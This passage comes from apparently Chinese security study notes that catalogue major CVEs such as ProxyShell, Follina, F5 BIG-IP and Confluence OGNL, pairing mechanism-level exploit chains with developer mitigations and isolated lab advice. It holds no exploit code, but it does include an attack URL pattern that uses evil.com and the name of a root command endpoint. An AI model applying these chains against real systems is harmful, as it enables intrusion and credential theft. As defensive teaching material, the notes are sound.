**触发机制**：PHP 核心中的**内存破坏类缺陷（官方记录为 CWE-416/824：UAF/未初始化指针访问）**：特定输入序列导致内存越界/破坏，两者可组成一条**未认证、HTTP 可达**的利用链——对运行 PHP 的 Web 服务（mod_php/FPM 等）发构造请求即可触发，无需应用层漏洞。公开 PoC 在 PHP 8.5.11 + Apache/mod_php 环境验证可拿到 `www-data` 执行权限（细节见厂商分析，本笔记不展开内存布局细节，方法学见 [[21-栈溢出与堆溢出]]）。

**利用链（机制层面）**：构造触发内存破坏的 HTTP 请求 → 堆/内存布局操纵 → 控制流劫持 → 以 Web 服务进程身份执行命令。

**开发时规避**：

- **运行时语言本身也是依赖**：PHP/JVM/Node/V8 的版本进 SCA 视野，语言级 CVE 与库级 CVE 同等级别响应；用容器交付的，基础镜像要跟安全更新。
- 已停支持分支（PHP 7.4/8.0/8.1 本次提供了 backport）说明：**EOL 运行时在真实世界里仍然到处都是**——把「运行时支持期」当硬约束写进工程规范（[[30-安全编码规范]]、[[33-安全-SDLC]]）。
- 应用层做不了什么就直接防御：WAF/限流降低扫描效率，Web 进程最小权限（非 www-data 写权限收敛）、只读根文件系统容器。

### 2.13 ProxyLogon / ProxyShell（CVE-2021-26855 / CVE-2021-34473）——SSRF 把内网信任撕开

**基本信息**：Microsoft Exchange Server 2013/2016/2019，ProxyLogon CVSS 9.8（2021-03-02 紧急补丁）、ProxyShell CVSS 9.8（三个 CVE 于 2021-04 修复，2021-07 利用细节公开后被大规模利用）。Hafnium 等团伙以 0day 大规模利用，美国境内约 3 万+组织失陷。参考：[NVD ProxyLogon](https://nvd.nist.gov/vuln/detail/CVE-2021-26855)、[NVD ProxyShell](https://nvd.nist.gov/vuln/detail/CVE-2021-34473)。

**触发机制**：Exchange 前端到后端服务的转发链上存在 **SSRF（CWE-918）**，两条链的触发点不同。**ProxyLogon（CVE-2021-26855）** 的 SSRF 由前端代理对 `X-BEResource` cookie 的处理触发：cookie 指定的后端服务器被前端当作代理目标，攻击者借此让前端替自己向任意后端接口发起请求，而后端凭**前后端之间的服务器证书**把这种请求视为合法前端——于是攻击者可以冒充前端身份访问 MAPI/EWS 等内部接口。**ProxyShell（CVE-2021-34473）** 的入口则是 Autodiscover 端点的路径混淆：`/autodiscover/autodiscover.json?@evil.com/...` 形式的 URL 把攻击者请求「变形」成对后端任意路径（如 ECP）的代理请求，再配合 CVE-2021-34523（ECP 认证绕过）与 CVE-2021-31207（认证后任意文件写）成链。

**利用链（机制层面）**：

1. SSRF 冒充前端身份 → 枚举并接管指定用户身份（ProxyLogon 的 legacyDN 交换步骤；ProxyShell 的 Autodiscover→ECP 链）；
2. 落盘 WebShell：ProxyLogon 借代理写权限触发不安全反序列化（同批次 CVE-2021-26857，CWE-502）或滥用 OAB（离线通讯簿）生成逻辑；ProxyShell 经 ECP 把含 WebShell 的邮件导出为 `.aspx` 文件；
3. 邮件系统是凭据中心：拿下 Exchange = 全组织邮件 + SSO 生态信任锚点，直接用于横向移动与供应链渗透。

**开发时规避**：

- 后端服务**绝不单凭「来自前端的证书/内网地址」判定身份**：内部 API 用端到端认证（服务身份 + 请求签名），前端转发时携带并校验用户上下文——「信任边界在内网也不存在」；
- SSRF 防护（见 [[13-CSRF-与-SSRF]]）：代理类接口白名单 + **URL 归一化后再校验**（路径混淆恰是这类链的起点）；
- 邮件/身份类核心资产收敛暴露面（ECP/EWS 不直接面向公网）、WebShell 监控、最高优先级补丁 SLA。

### 2.14 Follina（CVE-2022-30190）——文档自己调用了系统诊断工具

**基本信息**：Windows MSDT（Microsoft Support Diagnostic Tool），CVSS 7.8（钓鱼场景实际影响远高于分值），2022-05 修复；俄背景 APT 针对乌克兰等目标使用。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)。

**触发机制**：Word 文档可包含指向远程 HTML 的外部链接；该 HTML 中嵌入 `ms-msdt:` URI（携带 `IT_BrowseForFile` 等参数）。用户打开文档——**甚至仅 Explorer 预览窗格**——系统就把 URI 交给 MSDT 处理，MSDT 诊断模板按参数拼接并执行命令 → **任意 PowerShell 执行**。全程无需宏、无需真实点击。

**利用链（机制层面）**：钓鱼投递 .doc → 预览/打开触发 ms-msdt → MSDT（sdiagnhost.exe）按参数执行攻击者命令 → 植入后门/侦察。它是「零点击倾向」链的教科书：**受害者唯一的动作是收到文件**。

**开发时规避**（端点运营为主）：

- 收敛 OS 级 URI 处理器攻击面：禁用/删除 `ms-msdt` 协议处理器与诊断服务；同类教训适用于一切「文档可自动唤起」的协议处理器；
- Egress 管控：文档渲染进程不该出网取「模板」资源；用户网段限流出站方向；
- Office 预览/OLE 链接按风险分层禁用；EDR 监控 sdiagnhost.exe 与 Office 子进程的异常派生关系。

### 2.15 F5 BIG-IP（CVE-2022-1388）——管理接口的认证被一行请求绕过

**基本信息**：F5 BIG-IP iControl REST 接口，CVSS 9.8，2022-05-04 修复，**修复披露后数日内全网大规模利用**。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-1388)。

**触发机制**：iControl REST 的特定请求处理路径存在**认证绕过（CWE-306）**：特定 header/路径组合让鉴权环节判定「已认证」，随后请求直达 `/mgmt/tm/util/bash` 这个管理端点——它本身就允许以 root 执行 tmsh/bash 命令。两个本来各自有限的属性叠加 = 未认证 root 命令执行。

**利用链（机制层面）**：发送绕过认证的请求到 bash 端点 → root 命令执行 → 批量扫描器自动接管设备 → 翻转流量、植入持久化。BIG-IP 是流量关键路径设备，接管后可窃取全部转发凭据。

**开发时规避**：

- **管理面与数据面物理分离**：管理接口/iControl 绝不从互联网可达（专用管理网 + 防火墙白名单）；
- 「能执行命令的管理端点」单独做威胁建模：强认证（MFA/证书）、操作审计、限速；
- 鉴权中间件要**全局兜底默认 401**、显式清单式放行——§3 规律 3 的又一实证。

### 2.16 Confluence（CVE-2022-26134）——OGNL：把 URL 当表达式解析

**基本信息**：Atlassian Confluence Server/Data Center，CVSS 9.8，2022-06-02 修复，披露后数日内即在野利用。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)。

**触发机制**：请求 URL 路径中被注入的 **OGNL 表达式**（`${...}`，URL 解码后）被框架参数处理机制当作表达式**求值**（CWE-917）。OGNL 是 Struts/XWork 生态的表达式引擎，功能强到可以直接执行 Java 代码。与 2017 年 Struts2 S2-045 同根同源。

**利用链（机制层面）**：GET 请求路径夹带 OGNL → 框架求值 → 反弹 shell/落 WebShell → 接管内部知识库。Confluence 通常内含大量凭据、拓扑与流程文档，是理想的横向跳板。

**开发时规避**：

- 任何表达式引擎（OGNL/SpEL/EL/MVEL/QLExpress）对用户输入**默认拒绝**；确需动态求值时用受限上下文（如 SpEL `SimpleEvaluationContext`，禁用类型引用与方法调用）；
- 同类案例：Spring Cloud Function CVE-2022-22963（SpEL 注入 RCE，与 Spring4Shell 同期爆发）——**一切「字符串 → 代码」的通道都按注入对待**（见 [[30-安全编码规范]]）。

### 2.17 Outlook（CVE-2023-23397）——真正的零点击：邮件到了，凭据就走了

**基本信息**：Microsoft Outlook（提权/凭据泄露），CVSS 9.8，2023-03-14 修复并披露；APT28 自 2022 年起对乌克兰等目标利用。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)。

**触发机制**：Outlook 日历/邮件提醒的「提示音文件」属性（PidLidReminderFileParameter）可指向 **UNC 路径**。提醒处理是客户端的被动行为：邮件到达、提醒触发时，Outlook 自动尝试加载该文件 → 发起 SMB 连接 → **自动协商 NTLM 认证，把 Net-NTLMv2 哈希发给攻击者服务器**。受害者唯一的「动作」是收到了这封邮件。

**利用链（机制层面）**：

1. 投递带恶意提醒属性的邮件 → 目标 Outlook 自动外连 SMB → 泄露 NTLMv2；
2. 中继（NTLM relay）到 Exchange Web Services / 内网 SMB 等接受 NTLM 的服务 → 接管邮箱、横向移动；
3. 无交互、无告警——「凭据自动协商」这一协议遗产缺陷的标准噩梦。

**开发时规避**：

- 认证现代化：全域迁移 Kerberos/现代认证、**逐步禁用 NTLM**（Windows 提供审计→阻止的分级路径）、启用 SMB 签名与 Exchange Extended Protection；
- Egress 管控：用户终端**不应主动出站 SMB/445**（策略阻断 + 告警）——这一条同时压制 Follina 类与 NTLM 泄露类链路；
- 客户端产品开发视角：任何「被动处理消息时自动发起网络请求」的功能必须过安全评审——零点击链的通用温床。

### 2.18 TeamCity（CVE-2023-42793）——构建服务器是供应链的金库

**基本信息**：JetBrains TeamCity（on-prem CI/CD），CVSS 9.8，2023-09-20 修复；**APT29 与勒索团伙均用于初始访问**（CISA 联合公告 AA23-347A）。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-42793)。

**触发机制**：TeamCity 某端点的认证检查可被**非规范请求路径**绕过（CWE-288）：备用 URL 解析路径没有经过鉴权过滤器，未认证请求直接可达管理 REST API。

**利用链（机制层面）**：

1. 绕过认证 → 创建管理员访问令牌 → 调用受保护功能（上传自定义插件/执行调试命令）→ RCE；
2. CI/CD 服务器上全是**构建凭据与代码签名密钥**——APT29 以此污染下游构建产物，直接构成供应链攻击入口（[[31-依赖与供应链安全]] 的活案例）；勒索团伙则加密构建资产勒索。

**开发时规避**：

- CI/CD/内部管理类系统进**边界资产清点**（它们常年「隐形」却又常直面互联网）；非规范 URL（路径混淆、分号、双重编码）先归一化再鉴权；
- 构建凭据最小化：短时效令牌、按构建任务隔离（Runner 无全局密钥）、签名密钥进 KMS（[[32-密钥管理]]）；
- 高价值告警：管理员令牌创建、插件上传、构建脚本异常变更。

### 2.19 Fortinet FortiOS（CVE-2024-21762）——补了 0day 仍被扫光

**基本信息**：FortiOS SSL VPN 堆越界写（CWE-787），CVSS 9.8，2024-10 发布补丁，2024-12 Fortinet 紧急警告在野利用，2024 底—2025 初遭遇大规模扫描利用。同类的还有 CVE-2023-27997（SSL VPN 堆溢出，0day 在野）。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-21762)、[CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)。

**触发机制**：SSL VPN 请求处理中堆缓冲区越界写 → 未认证 RCE。Fortinet 边界设备近年连发内存安全类 RCE，已成为持续出血点。

**利用链（机制层面）**：向 SSL VPN 发送畸形请求 → 越界写 → 劫持控制流执行命令 → 批量扫描器自动收割未修复设备 → 翻转流量、窃取 VPN 凭据横向渗透。

**开发时规避**：

- 厂商侧不再赘述（内存安全老问题）；本次的新看点在**运营侧**：Fortinet 最终对未修复设备**强制升级固件并重置凭据**——对「用户总是不及时打补丁」的边界产品，供应商强制措施应写进采购 SLA；
- 不用 SSL VPN 就直接禁用该功能（攻击面清点）；VPN 凭据定期轮换、监控异常会话。

### 2.20 Ivanti Connect Secure（CVE-2025-0282 / CVE-2025-22457）——间谍团伙的「完美初始访问」

**基本信息**：Ivanti Connect Secure（原 Pulse Secure）VPN，两处栈缓冲区溢出（CWE-121）：CVE-2025-0282 CVSS 9.0（2025-01-08 修复；UNC5225 自 2024 年 12 月起将其作为 0day 使用，配套 TRAILBLAZE/BRUSHFIRE 定制恶意软件）、CVE-2025-22457 CVSS 9.3（2025-04 修复，在野利用自 2025-03 起）。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-0282)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-22457)。

**触发机制**：Web 服务器组件处理请求时栈缓冲区溢出 → 未认证 RCE。间谍团伙专盯「VPN 网关 = 内网护照」这一属性，把 ICS 当作完美初始访问入口。

**利用链（机制层面）**：畸形请求触发栈溢出 → RCE → 落盘持久化后门 → 窃取 VPN 会话/凭据 → 以合法会话进入内网（又是 §2.5/2.10 的会话劫持套路）。

**开发时规避**：

- Ivanti 系列 2023—2025 连续失陷（EPMM 2023、ICS 2024/2025）给出的结论很硬：**把被反复攻破的边界产品列入「信任重估」清单**，必要时停用/更换 VPN 网关功能；
- 修复后运行完整性检查工具（ICT）、必要时恢复出厂；VPN 强制 MFA + 会话吊销；
- 工程侧长期答案仍是内存安全语言——与 §2.5、§2.19 同主题：边界设备是 C/C++ 越界缺陷的最终聚集地。

### 2.21 Oracle E-Business Suite（CVE-2025-61882）——CL0P 又换了一个「单一入口」

**基本信息**：Oracle EBS Concurrent Processing / BI Publisher Integration 组件，CVSS 9.8，2025-10-04 紧急修复，CL0P 大规模勒索。参考：[Oracle 公告](https://www.oracle.com/security-alerts/alert-cve-2025-61882.html)、[Rapid7 ETR](https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild)、[Google 威胁情报](https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation)。

**触发机制**：Concurrent Processing / BI Publisher Integration 组件存在**认证不当（CWE-287）**缺陷：**未认证 HTTP 请求即可完全接管**该组件 → RCE。

**利用链（机制层面）**：未认证 HTTP 请求完全接管 Concurrent Processing → RCE → 批量窃取业务数据 → 直接向受害者发勒索邮件（不加密式勒索）。CL0P 的目标画像已完全固定：**Accellion → GoAnywhere → MOVEit → Cleo → Oracle EBS**——专挑「承载全组织数据/文件的单一入口商业产品」下手，剧本与 §2.4 一脉相承。

**开发时规避**：

- 认证兜底原则照 §3 规律 10（默认 401 + 显式放行清单，鉴权前先做 URL 归一化）；
- 商业 ERP/文件类核心系统进 KEV 级补丁 SLA；针对 CL0P 类「先偷后勒索」，**检测重点是异常批量导出/外发，而不是加密行为**——等看到加密已经晚了。

### 2.22 其他一句话案例（近五年补充与早期经典）

| CVE | 组件 | 一句话机制与教训 |
| --- | --- | --- |
| CVE-2022-0778 | OpenSSL 1.0.2/1.1.1/3.x | 解析畸形证书触发大数运算**死循环**（DoS）：解析器对「可能被攻击者控制的输入」要做复杂度/超时上限 |
| CVE-2025-24813 | Apache Tomcat | 部分默认配置 + PUT 上传写会话文件 → 反序列化 RCE：默认配置即攻击面 |
| CVE-2025-6543 | Citrix NetScaler ADC/Gateway | 内存损坏缺陷，可致未认证 RCE/DoS（2025-06 与 CVE-2025-5777 同批披露、在野利用）：ADC 再次上榜，边界设备补丁 SLA 长期化 |
| CVE-2021-21974 | VMware ESXi（OpenSLP） | SLP 服务堆溢出 → ESXiArgs 勒索潮（2023）：虚拟化层本身必须进补丁 SLA |
| CVE-2022-22963 | Spring Cloud Function | SpEL 表达式注入 RCE，与 Spring4Shell 同期爆发：见 §2.16 |
| CVE-2023-22518 | Atlassian Confluence | 授权缺失 → RCE，勒索团伙大规模利用 |
| CVE-2023-3519 | Citrix NetScaler | 未认证 RCE，APT 定向利用 |
| CVE-2023-4911 | glibc ld.so（Looney Tunables） | 环境变量解析缓冲区溢出 → 本地提权：基础库也要进补丁视野 |
| CVE-2024-38063 | Windows TCP/IP（IPv6 栈） | 整数溢出 → 未认证 RCE，理论上可蠕虫化：内核网络栈 fuzzing 与快速补丁 |
| CVE-2024-47575 | FortiManager（FortiJump） | 认证缺失 → 被用于接管管理器、批量向受管设备下发恶意脚本：单点管理工具是放大器 |
| CVE-2024-45519 | Zimbra | postjournal 命令注入 → 未认证 RCE |
| CVE-2024-50623 | Cleo | 文件自动处理未认证 RCE，CL0P 系列又添一员（见 §2.21 目标画像） |
| CVE-2024-20353/20359 | Cisco ASA/FTD | DoS + 任意配置读写（ArcaneDoor 间谍行动） |
| CVE-2025-30065 | ansible-core | ANSIBLE_VAULT 标签解析注入 → 任意代码执行（CVSS 10.0） |
| CVE-2025-3248 | Langflow | validate/code 端点缺认证 → Python 代码注入 RCE（Flodrix 僵尸网络）：AI 应用框架成为新攻击面 |
| CVE-2025-43300 | Apple ImageIO | DNG 图像解析越界写 → 零点击间谍软件投放（针对记者/公民社会） |
| CVE-2025-59287 | Windows WSUS | 未认证 .NET 反序列化 RCE，Microsoft「正在被利用」评级 |
| CVE-2025-64446 | Fortinet FortiWeb | 相对路径遍历（CWE-23）权限提升：构造 HTTP/HTTPS 请求执行管理命令；CVSS 3.1 9.4、KEV，2025-11-14 发布；影响 7.0.0–7.0.11、7.2.0–7.2.11、7.4.0–7.4.9、7.6.0–7.6.4、8.0.0–8.0.1 |
| CVE-2026-111497 | Google Brotli 解码器 | 解码器（c/dec/decode.c）越界写（CWE-787）+未检查返回值（CWE-252）：特制压缩流可破坏内存/泄露信息/执行代码；CVSS 9.2、KEV、在野利用，2026-10-22 发布；影响 brotli 1.0.3–1.0.9、1.1.0、1.2.0 |

> 2026 年 KEV 节奏参考：[2026-10-26 KEV 新增警报](https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog)、[PHP 紧急修复警报](https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching)、[HivePro 2026-06 月度摘要](https://hivepro.com/threat-digests/cisa-known-exploited-vulnerability-catalog-june-2026)（单月新增 23 条、其中 6 条 0day）——「运行时、语言内核与基础库的 CVE」已是常态，不是新闻。

---

## 3. 横向规律（比任何单案例都重要）

1. **解析器是头号攻击面**。日志宏（Log4j）、属性绑定（Spring）、Flight 协议（React）、证书（OpenSSL）、序列化器（SharePoint）、语言内核（PHP）——「把不可信输入交给一个为便利而设计的解析器」是 RCE 的第一成因。开发对应物：**schema 校验、类型白名单、复杂度上限、fuzzing**。
2. **RCE 链几乎都是小缺陷的组合**：路径遍历→文件写→命令执行（PAN-OS）、SQL 注入→文件写→WebShell（MOVEit）、认证绕过→上传→RCE（SAP）。纵深防御的价值在于**打断链条任意一环**——没有哪个单独缺陷该被放任。
3. **「未认证」缺陷最廉价也最致命**。SAP、MOVEit、Log4j、React、PAN-OS 的入口都是零凭据。审计时优先问：哪些端点在认证中间件之外？哪些组件默认开启且直面互联网？
4. **内存安全仍是边界设备与语言运行时的主旋律**。Citrix ×2、Fortinet、PAN-OS、PHP——C/C++ 大规模代码库的越界读写短期内不会消失；应用侧能做的是最小权限、FIM、egress 管控；工程侧的长期答案是内存安全语言。
5. **密码学误用是一票否决项**。Zerologon 只有一个固定 IV，全域失陷。密码学代码不值得「看起来对」，要「按规范证明对」。
6. **供应链是新的信任边界**。XZ 的后门不在 git 里、不在源码扫描范围内——构建过程、发布制品、维护者身份都要进威胁模型。
7. **补丁不是终点**。CitrixBleed ×2 的会话未清空、ToolShell 的 MachineKey 未轮换——**修复完成 = 补丁 + 吊销/轮换一切可能已被窃取的凭据**。
8. **响应速度决定影响面**。ToolShell 从补丁到大规模利用 72 小时；MOVEit 在补丁窗口期内被扫光。没有 KEV/EPSS 驱动的补丁 SLA（[[33-安全-SDLC]]）和虚拟补丁（[[27-防火墙与-IDS-IPS]]），边界产品迟早失守。
9. **端点办公链是新的初始访问重心**。Follina、Outlook 23397 不需要任何 Web 输入——文档与邮件客户端在「被动处理」时就自己发起网络请求。端点侧的对策三件套：出站管控（SMB/445 不该从用户终端出去）、URI 处理器最小化、NTLM 迁移。
10. **认证必须「全局兜底」**。F5、TeamCity、SAP、Langflow 的入口全是「某个端点忘了挂认证」或「被非规范路径绕过鉴权」。默认 401 + 显式放行清单是唯一可靠姿势；且鉴权前先做 URL 归一化——路径混淆、分号、编码变体是绕过鉴权过滤器最常见的形态。

---

## 4. 开发者防御落地清单（对照 SDLC）

把 §3 的规律翻译成「自己项目里能做的动作」：

**设计期**
- [ ] 威胁建模时把「解析不可信输入的自研组件」列为高优先级资产（[[07-威胁建模]]）
- [ ] 自定义 RPC/序列化协议：服务端 schema 校验为强制项，写进协议文档
- [ ] 开发/调试端点默认不进生产构建；路由权限默认拒绝

**编码期**（[[30-安全编码规范]]）
- [ ] 日志/反射绑定/序列化：不透传原始用户输入；绑定白名单；反序列化类型白名单
- [ ] 文件名/路径/命令：服务端生成 + 归一化 + 白名单目录；杜绝字符串拼接 shell
- [ ] 密码学：只用标准库的推荐用法，IV/nonce 随机化，不自造协议

**依赖期**（[[31-依赖与供应链安全]]）
- [ ] SCA 扫描含**语言运行时与基础镜像**；锁文件提交；SBOM 生成并留存
- [ ] 订阅 KEV/EPSS，对「互联网可达组件」设小时级补丁 SLA
- [ ] 构建：可复现构建 + 构建脚本审计 + 制品与源码一致性抽查

**测试期**
- [ ] 解析器/协议实现强制 fuzzing（越界读/写类缺陷的最低成本发现手段）
- [ ] SAST/DAST 进 CI 门禁；对历史重灾区（绑定、上传、反序列化）写专项用例

**发布与运营期**（[[33-安全-SDLC]]、[[34-应急响应基础]]）
- [ ] 密钥清单化：知道系统里有哪些长期凭据（MachineKey/签名密钥/服务账户），补丁事件按清单轮换
- [ ] 补丁预案固定包含「失效全部会话」步骤
- [ ] Egress 管控（拦截异常外连）+ 文件完整性监控 + 会话异常重放告警
- [ ] CI/CD 与管理面（TeamCity/Jenkins/F5 iControl 类）纳入边界资产清点与 KEV SLA；构建凭据短时效、按任务隔离
- [ ] 端点三件套：用户网段出站 SMB 管控、Office/系统 URI 处理器最小化、NTLM 迁移计划

---

## 5. 复现建议（仅限本地隔离环境）

| CVE | 复现途径 | 备注 |
| --- | --- | --- |
| Log4Shell | vulhub：`log4j2/CVE-2021-44228` | 一键环境，观察 JNDI 外连流量（配合 [[26-Wireshark-流量分析]]）最佳入门 |
| Spring4Shell | vulhub：`spring/CVE-2022-22965` | 观察 Tomcat 访问日志被改写为 JSP 的过程 |
| MOVEit / SAP / SharePoint / PAN-OS | 无公开合法靶场镜像，**只读分析厂商公告与研究报告** | 这些是商业闭源产品，不要用真实 license 环境「练手」 |
| Zerologon | 理论理解 + 实验室域控（自建 AD 靶场）可观察行为，**不建议动手** | 应急视角更有价值：看 Dirk-Jan 的恢复脚本理解影响 |
| XZ | 在隔离容器中对比 5.6.0 与 5.6.2 的构建产物差异、复跑上游分析文章的检测方法 | 供应链视角，非利用视角 |
| React2Shell / PHP2Shell | 等待/自建隔离靶场，或只用厂商检测规则做**检测侧**演练 | 新披露漏洞，先用官方 IoC/检测规则建告警即可 |
| Confluence CVE-2022-26134 | vulhub：`confluence/CVE-2022-26134` | OGNL 注入入门，与 Struts2 S2-045 对照学习 |
| TeamCity CVE-2023-42793 | vulhub：`teamcity/CVE-2023-42793` | 观察「认证绕过 → 管理令牌 → RCE」链路 |
| Follina / Outlook 23397 | 仅在隔离 Windows VM 做**缓解验证**（禁 ms-msdt 协议、出站 SMB 策略对照），不制作利用文档 | 端点链重在防御演练而非利用 |
| ProxyLogon / F5 / Fortinet / Ivanti / Oracle EBS | 商业闭源产品，无公开合法靶场 → 只读分析公告与研究报告 | 与 MOVEit/SAP/SharePoint 同列 |

所有实验遵守工作区红线：本地隔离环境、可运行说明齐全、不制作武器化载荷。

---

## 6. 与既有笔记的关系

- [[08-漏洞分类-OWASP-Top10-CWE-CVE]]：本文是 CVE 实例库，CWE 编号 ↔ 案例互查
- [[11-SQL-注入]] / [[14-文件上传漏洞]] / [[15-反序列化漏洞]]：案例 4/8/9 的原理课
- [[16-认证与会话管理]]：案例 5/10 的会话劫持与令牌设计
- [[20-程序内存布局]] / [[21-栈溢出与堆溢出]]：案例 5/7/12 的内存安全方法学
- [[26-Wireshark-流量分析]] / [[28-日志分析与-SIEM]]：各案例的检测侧落地
- [[31-依赖与供应链安全]]：案例 6 的治理体系
- [[32-密钥管理]]：案例 9 的 MachineKey 轮换
- [[33-安全-SDLC]] / [[34-应急响应基础]]：§4 清单与补丁/事件流程
